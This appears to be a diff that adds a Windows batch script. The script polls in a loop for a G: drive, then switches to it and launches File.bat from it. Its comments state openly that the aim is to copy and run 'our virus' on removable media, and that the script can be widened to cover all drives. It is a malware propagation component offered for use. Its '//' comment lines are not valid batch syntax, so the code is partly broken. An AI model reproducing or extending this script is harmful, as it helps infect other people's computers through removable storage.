@@ -1,0 +1,20 @@
+@echo off
+:a
+if exist G:\ (goto Yes) else (goto a)
+
+//the above lines will recursively check for existing G drive
+//if it exist then it will execute the code written in yes block 
+//this above code can be modified to check for all the drives
+//then we can use the other scripts to copy the malocious files to them and execute them
+
+:Yes
+G:
+start File.bat
+goto end
+
+//in the above block the program now knows that there is a drive that we need
+//so it starts executing a particular program from the drive
+//we can use this process to copy and run our virus in any removable media or storage
+
+:end
+exit
